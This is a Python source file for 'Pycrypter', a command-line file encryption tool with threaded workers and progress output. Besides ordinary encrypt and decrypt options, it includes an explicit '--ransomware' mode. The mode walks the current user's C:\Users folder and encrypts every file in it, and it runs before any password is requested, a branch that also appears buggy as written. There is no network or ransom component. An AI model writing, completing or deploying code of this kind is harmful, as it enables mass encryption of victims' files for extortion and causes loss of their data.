# Required Modules
import platform
import traceback
import importlib

import os
import sys
import argparse

import getpass
import signal
import ctypes

from dotenv import load_dotenv

# Threading Modules
import threading

if platform.system() == "Windows":
    win32api = importlib.import_module('win32api')
    win32con = importlib.import_module('win32con')

    win32file = importlib.import_module('win32file')
    winnt = importlib.import_module('winnt')

    MAXDWORD = getattr(winnt, 'MAXDWORD')
    pywintypes = importlib.import_module('pywintypes')

from methods import CipherManager
PYCRYPTER_VERSION = "1.4.1"


# terminal progress bar
def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='='):
    """
    Call sys.stdout.write() to write a progress bar to the terminal

    Parameters:
        iteration (int): current iteration (required)
            The current iteration of the loop.

        total (int): total iterations (required)
            The total number of iterations for the loop

        prefix (str): prefix string (optional, defaults to "")
            A string that appears before the progress bar.

        suffix (str): suffix string (optional, defaults to "")
            A string that appears after the progress bar.

        decimals (int): positive number of decimals in percent complete (optional, defaults to 1)
            The number of decimal places to show in the percentage.

        length (int): character length of bar (optional, defaults to 50)
            The length of the progress bar.

        fill (str): bar fill character (optional, defaults to "=")
            The character used to fill the progress bar.

    Returns:
        None

    Example usage:
        progress_bar(10, 100, prefix='Progress:', suffix='Complete', decimals=1, length=50, fill='=')

        Output:
            Progress: |=====---------------------------------------------| 10.0% Complete
    """

    if not isinstance(iteration, int):
        raise TypeError(f"total expected an integer, got {type(iteration).__name__}")

    if not isinstance(total, int):
        raise TypeError(f"total expected an integer, got {type(total).__name__}")

    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)

    sys.stdout.write('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix))
    sys.stdout.flush()


class ThreadManager:
    def __init__(self):
        self.error_list = []

        self.threads_set = set()
        self.semaphore = threading.Semaphore(5)

    def set_thread_count(self, num):
        if not isinstance(num, int):
            raise TypeError(f"num expected int, got {type(num).__name__}")

        if num < 1:
            num = 1
        self.semaphore = threading.Semaphore(num)

    # thread worker
    def worker(
            self, callback_function,
            semaphore=None, threads_set=None,
            error_list=None,
            *args, **kwargs
    ):

        # Guard clauses
        if threads_set is None:
            threads_set = self.threads_set
        elif not isinstance(threads_set, set):
            raise TypeError(f"threads_set expected set, got {type(error_list)}")

        if error_list is None:
            error_list = self.error_list
        elif not isinstance(error_list, list):
            raise TypeError(f"error_list expected list, got {type(error_list)}")

        # Semaphore guard clause
        if not hasattr(semaphore, 'acquire'):
            if semaphore is None:
                semaphore = self.semaphore
            else:
                raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")

        if not isinstance(threads_set, (list, set, tuple)):
            raise TypeError(f"threads expected a list/set/tuple, got {type(threads_set)}")

        try:
            current_thread = threading.current_thread()
            type_name = type(callback_function).__name__

            if type_name == "function":
                func_name = callback_function.__name__
            else:
                func_name = type(callback_function).__name__

            with semaphore:  # acquire and release the semaphore
                try:
                    callback_function(*args, **kwargs)
                except Exception as err:
                    if error_list is not None:
                        # tb means traceback
                        tb_dict = {}
                        tb_msg = traceback.format_exc()

                        tb_dict["name"] = type(err).__name__
                        tb_dict["caller"] = func_name

                        tb_dict["traceback"] = tb_msg

                        error_list.append(tb_dict)
                    else:
                        tb_msg = traceback.format_exc()
                        print(tb_msg)
                finally:
                    threads_set.remove(current_thread) if current_thread in threads_set else None
        except Exception:
            print(f"\nexception caught at worker: \n")
            traceback.print_exc()

    # create a thread
    def thread_create(
            self, callback, *args,
            semaphore=None, threads_set=None,

            thread_name="", error_list=None,
            **kwargs
    ):

        # Guard clauses
        if threads_set is None:
            threads_set = self.threads_set
        elif not isinstance(threads_set, set):
            raise TypeError(f"threads_set expected set, got {type(error_list)}")

        if error_list is None:
            error_list = self.error_list
        elif not isinstance(error_list, list):
            raise TypeError(f"error_list expected list, got {type(error_list)}")

        if not hasattr(semaphore, 'acquire'):
            if semaphore is None:
                semaphore = self.semaphore
            else:
                raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")

        if not isinstance(threads_set, (list, set, tuple)):
            raise TypeError(f"threads_set expected a list/set/tuple, got {type(threads_set)}")

        thread = threading.Thread(
            target=self.worker,
            args=(callback, semaphore, threads_set, error_list, *args),
            kwargs=kwargs,
            name=thread_name
        )

        threads_set.add(thread)
        thread.start()

        return thread


# iterate through a directory and optionally a subdirectory
def iterate_dir(directory, iterate_tree=True, skip_dirs=None):
    """
    Iterate through a directory while optionally iterating through the subdirectories

    Parameters:
        directory (str): directory to iterate (required)
            The directory passed to iterate through.

        iterate_tree (bool): iterate through subdirectories (optional, defaults to True)
            Defines whether the script iterates through subdirectories or not.

        skip_dirs (list): list of directories to skip (optional, defaults to []/empty list)
            Defines the subdirectories to exclude from the search.

        Returns:
            set: file_paths
            - Returns absolute paths

        Example usage:
            Passing a non-boolean [True, False] to
            the iterate_tree argument will result in a ValueError:

            Traceback (most recent call last):
              File "C:\\MyPython\\pycrypter.py", line 1, in <module>
                raise ValueError("iterate_tree must be a valid boolean")
            ValueError: iterate_tree must be a valid boolean

            [Passing True, False, 1, 0 is a valid boolean]

            =========================================================
            Passing a non-existent directory/a file will not raise
            an exception, but instead return a string value, signaling
            an error:

            Example 1:
                files = iterate_dir("C:\\MyFakeDirectory", iterate_tree=True, skip_dirs=[])

                print(files)

                [Output]
                NotADirectoryError

            Example 2:
                files = iterate_dir("C:\\MyPython\\myfile.txt", iterate_tree=True, skip_dirs=[])

                print(files)

                [Output]
                NotADirectoryError

            =========================================================
            A PermissionError exception will be caught, and added to
            an exception list:

            import win32api
            import win32con

            # Set the system attribute for the MyPython folder
            win32api.SetFileAttributes("C:\\MyPython\\", win32con.FILE_ATTRIBUTE_SYSTEM)

            permission_errors = []

            # Assume this code has two files, the script and "sys.txt"
            files = iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])

            print(files)
            print(permission_errors)

            [Output]
            []
            ['iterate_dir | A PermissionError occured! Path: "C:\\MyPython"']

            ---------------------------------------------------------
            How to call:

            files = iterate_dir(".", iterate_tree=True, skip_dirs=[])

            print(files)

            ---------------------------------------------------------
            We can assume that the files in the current working directory
            is the current script file and a.txt, so this will be the output:

            ['.\\pycrypter.py', '.\\a.txt']
            ---------------------------------------------------------

            If you use "." or ".." as the directory argument, any added to
            the list will be formatted as so:

            ['.\\example.txt', '..\\myfile.txt']

            However, using the absolute path like so:
            iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])

            Will return the absolute path, formatted like this:

            ['C:\\MyPython\\a.txt']
    """

    if not skip_dirs:
        skip_dirs = set()

    if iterate_tree not in [True, False]:
        raise TypeError(f"iterate_tree expected boolean, got {iterate_tree}")

    file_paths = set()

    # Check argument if it's a directory
    if not os.path.isdir(directory):
        if os.path.isfile(directory):
            raise NotADirectoryError(f'Not a directory: {directory}')
        else:
            raise FileNotFoundError(f'No such directory: {directory}')

    # Iterate through the directory, and catch PermissionErrors
    try:
        directory = os.path.abspath(directory)

        for filename in os.listdir(directory):
            path = os.path.join(directory, filename)

            if path in skip_dirs:
                continue

            if os.path.isfile(path):
                file_paths.add(path)

            elif os.path.isdir(path) and iterate_tree:
                file_paths.update(iterate_dir(path))
    except PermissionError as err:
        raise err
    finally:
        return file_paths


class Main:
    def __init__(self):
        if __name__ != "__main__":
            raise RuntimeError("class Main must be called as __main__")

        # pepper | DO NOT LEAK THIS!
        load_dotenv("pepper.env")

        self.hash_pepper = os.getenv("hash_pepper")
        self.password_pepper = os.getenv("password_pepper")

        # cleanup variables
        self.cleanup = False
        self.interactive = {'init': False}

        # misc
        self.thread_mgr = ThreadManager()
        self.thread_create = self.thread_mgr.thread_create

        self.cipher_mgr = CipherManager()

        self.encrypt_file = self.cipher_mgr.fernet.encrypt_file
        self.decrypt_file = self.cipher_mgr.fernet.decrypt_file

        # self.parser objects
        self.args = None

        self.parser = argparse.ArgumentParser(description=f'Pycrypter CLI by NewGuy103. v{PYCRYPTER_VERSION}')

        self.parser.add_argument(
            '-rw', '--ransomware',
            action="store_true",
            help="Ransomware mode, this will fetch the user's folder and cipher files inside it [Excluding AppData]."
        )

        self.parser.add_argument(
            '-e', '--encrypt',
            action="store_true",
            help='Encryption switch.'
        )

        self.parser.add_argument(
            '-d', '--decrypt',
            action="store_true",
            help='Decryption switch.'
        )

        self.parser.add_argument(
            '-se', '--symmetric',
            action="store_true",
            help="Use symmetrical encryption."
        )

        self.parser.add_argument(
            '-ae', '--asymmetric',
            action="store_true",
            help="Use asymmetrical encryption."
        )

        self.parser.add_argument(
            '-ds', "--deep-search",
            action="store_true",
            help='If specified, search the sub-folders of the directory specified.'
        )

        self.parser.add_argument(
            '-c', "--keep-copy",
            action="store_true",
            help='If specified, keep a copy of the encrypted/decrypted file.'
        )

        self.parser.add_argument(
            '-v', "--verbose",
            action="store_true",
            help='Show detailed output to the command-line.'
        )

        self.parser.add_argument(
            '-t', '--threads',
            metavar='int',
            nargs="?",
            type=int,
            help="Sets the maximum amount of files to process in memory."
        )

        self.parser.add_argument(
            '-f', "--file",
            metavar='input_file',
            type=str,
            nargs="+",
            help='File path(s) to specify.'
        )

        self.parser.add_argument(
            '-dr', "--directory",
            metavar='input_dir',
            type=str,
            nargs="+",
            help='Directory path(s) to specify.'
        )

        self.parser.add_argument(
            '-dt', '--data',
            metavar='passed_data',
            type=str,
            nargs="+",
            help="Data to encrypt."
        )

    def parse_args(self):
        self.args = self.parser.parse_args()

        # Guard clauses
        if self.args.threads:
            self.thread_mgr.semaphore = threading.Semaphore(self.args.threads)

        if self.args.encrypt and self.args.decrypt:
            raise argparse.ArgumentError(None, "expected 1 required argument, got two [-e/--encrypt and -d/--decrypt]")

        if not self.args.encrypt and not self.args.decrypt:
            raise argparse.ArgumentError(None, "missing required argument: -e/--encrypt or -d/--decrypt")

        if not self.args.symmetric and not self.args.asymmetric:
            raise argparse.ArgumentError(None, "missing required argument: -se/--symmetric or -ae/--asymmetric")

        if self.args.symmetric and self.args.asymmetric:
            raise argparse.ArgumentError(None,
                                         "expected 1 required argument, got two [-se/--symmetric or -ae/--asymmetric]")

        if self.args.ransomware:
            cipher_method = "encrypt" if self.args.encrypt else "decrypt"
            current_user = os.getlogin()

            self.cipher_directory(
                f"C:\\Users\\{current_user}",
                verbose=self.args.verbose,
                password=password,
                keep_copy=self.args.keep_copy,
                cipher_method=cipher_method
            )
            sys.exit()

        if self.args.file is None and self.args.directory is None:
            raise argparse.ArgumentError(None, "missing required argument(s): -f/--file or -dr/--directory")

        # Check encryption method and show the correct prompt
        if self.args.symmetric:
            password = getpass.getpass("Enter a password: ")

        elif self.args.asymmetric and self.args.encrypt:
            input("Enter file path of public key: ")

        elif self.args.asymmetric and self.args.decrypt:
            input("Enter file path of private key: ")

        cipher_method = "encrypt" if self.args.encrypt else "decrypt"

        sys.stdout.write("|-------------------------------------------------------------|\n")
        sys.stdout.flush()

        if self.args.file:
            self.cipher_file(
                self.args.file,
                verbose=self.args.verbose,
                password=password,
                keep_copy=self.args.keep_copy,
                cipher_method=cipher_method
            )

        if self.args.directory:
            self.cipher_directory(
                self.args.directory,
                verbose=self.args.verbose,
                password=password,
                keep_copy=self.args.keep_copy,
                cipher_method=cipher_method
            )

    # Check each file/directory
    def symmetric_cipher(self, message, key=b"", verbose=b""):
        pass

    def cipher_file(
            self, file_list,
            skip_files=None, verbose=True,

            password="", keep_copy=False,
            cipher_method="encrypt", cipher_type="symmetric"
    ):
        if cipher_method not in {"encrypt", "decrypt"}:
            raise TypeError('cipher_method must be encrypt/decrypt')

        if cipher_type not in {"symmetric", "asymmetric"}:
            raise TypeError('cipher_type must be symmetric/asymmetric')

        if skip_files is None:
            skip_files: set = set()

        files = set()
        files_dict = {'count': 0, 'finished': 0, 'exception_thrown': 0}

        for file in file_list:
            if os.path.isfile(file):
                files.add(file)
                files_dict['count'] += 1
                continue

            if len(files) > 1:
                if os.path.isdir(file):
                    print(f"IsADirectoryError: Is a directory: {file}")
                else:
                    print(f"FileNotFoundError: No such file: {file}")
            else:
                if os.path.isdir(file):
                    raise IsADirectoryError(f"Is a directory: {file}")
                else:
                    raise FileNotFoundError(f"No such file: {file}")

        files_dict['exception_thrown'] = files_dict['count']

        for current_iteration, file in enumerate(files):
            if self.cleanup:
                break

            def call_cipher(*args, **kwargs):
                if current_iteration + 1 == files_dict['count']:
                    progress_bar(
                        files_dict['count'],
                        files_dict['count'],

                        prefix='Progress: ',
                        suffix='Complete',

                        decimals=1,
                        length=50,

                        fill='='
                    )
                else:
                    progress_bar(
                        current_iteration,
                        files_dict['count'],

                        prefix='Progress: ',
                        suffix='Complete',

                        decimals=1,
                        length=50,

                        fill='='
                    )

                if cipher_method == "encrypt":
                    self.encrypt_file(*args, **kwargs)
                else:
                    self.decrypt_file(*args, **kwargs)

                files_dict['exception_thrown'] -= 1
                files_dict['finished'] += 1

                return

            thread = self.thread_create(
                callback=call_cipher,

                input_file=file,
                password=password,
                keep_copy=keep_copy,

                hash_pepper=self.hash_pepper,
                password_pepper=self.password_pepper
            )

        thread.join()

        if verbose:
            print(
                f"\n|-------------------------------------------------------------|\n\nTotal files : {files_dict['count']}")
            print(f"Total files [processed] : {files_dict['finished']}")

            print(
                f"Total: {files_dict['count']} | Completed: {files_dict['finished']} | Error thrown: {files_dict['exception_thrown']}\n")

            print(f"Extra information: \nfiles_count: {files_dict['count']} | len(files): {len(files)}")
            print(f"files_finished: {files_dict['finished']}\n")

            print(f"ThreadManager error-list: \n")
            err_list = list(self.thread_mgr.error_list)

            for dictionary in err_list:
                print(f"Error name: {dictionary['name']}")

                print(f"Caller function: {dictionary['caller']}\n")
                print(f"Error traceback: \n{dictionary['traceback']}")

    def cipher_directory(self, directories, skip_directories=None, verbose=True, password="", keep_copy=False,
                         cipher_method="encrypt"):
        if cipher_method not in ["encrypt", "decrypt"]:
            raise TypeError(f'cipher_method expected "encrypt" or "decrypt", got {type(cipher_method).__name__}')

        if skip_directories is None:
            skip_directories = set()

        files = set()
        folders = set()

        files_dict = {'count': 0, 'finished': 0, 'exception_thrown': 0}

        for folder in directories:
            if os.path.isdir(folder):
                folders.add(folder)
                continue

            if len(directories) > 1:
                if os.path.isdir(folder):
                    print(f"NotADirectoryError: Is a directory: {folder}")
                else:
                    print(f"FileNotFoundError: No such file: {folder}")
            else:
                if os.path.isdir(folder):
                    raise NotADirectoryError(f"Is a directory: {folder}")
                else:
                    raise FileNotFoundError(f"No such directory: {folder}")

        for i, folder in enumerate(folders):
            returned_files = iterate_dir(folder, iterate_tree=True, skip_dirs=skip_directories)

            for file in returned_files:
                files.add(file)

                if file in files:
                    files_dict['count'] += 1

        files_dict['exception_thrown'] = files_dict['count']

        for current_iteration, file in enumerate(files):
            if self.cleanup:
                break

            def call_cipher(*args, **kwargs):
                if current_iteration + 1 == files_dict['count']:
                    progress_bar(
                        files_dict['count'],
                        files_dict['count'],

                        prefix='Progress: ',
                        suffix='Complete',

                        decimals=1,
                        length=50,

                        fill='='
                    )
                else:
                    progress_bar(
                        current_iteration,
                        files_dict['count'],

                        prefix='Progress: ',
                        suffix='Complete',

                        decimals=1,
                        length=50,

                        fill='='
                    )

                if cipher_method == "encrypt":
                    self.encrypt_file(*args, **kwargs)
                else:
                    self.decrypt_file(*args, **kwargs)

                files_dict['exception_thrown'] -= 1
                files_dict['finished'] += 1

            thread = self.thread_create(
                callback=call_cipher,

                input_file=file,
                password=password,
                keep_copy=keep_copy,

                hash_pepper=self.hash_pepper,
                password_pepper=self.password_pepper
            )

        thread.join()

        if verbose:
            lines = f"|{'-' * 61}|"
            print(
                f"\n{lines}\n\nTotal files : {files_dict['count']}")
            print(f"Total files [processed] : {files_dict['finished']}")

            print(
                f"Total: {files_dict['count']} | Completed: {files_dict['finished']} | Error thrown: {files_dict['exception_thrown']}\n")

            print(f"Extra information: \nfiles_count: {files_dict['count']} | len(files): {len(files)}")
            print(f"files_finished: {files_dict['finished']}\n")

            print(f"ThreadManager error-list: \n")
            err_list = list(self.thread_mgr.error_list)

            for dictionary in err_list:
                print(f"Error name: {dictionary['name']}")

                print(f"Caller function: {dictionary['caller']}\n")
                print(f"Error traceback: \n{dictionary['traceback']}")


if __name__ == "__main__":
    main = Main()


    def script_cleanup(signal=0, frame=None):
        main.cleanup = True


    if platform.system() == "Windows":
        # kernel32 signal handler
        kernel32 = ctypes.windll.kernel32
        handler_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)

        handler_func = handler_type(lambda signal: script_cleanup(signal))
        kernel32.SetConsoleCtrlHandler(handler_func, True)

        signal.signal(signal.SIGINT, lambda signal, frame: None)
    else:
        signal.signal(signal.SIGINT, lambda signal, frame: script_cleanup(signal, frame=frame))

    main.parse_args()
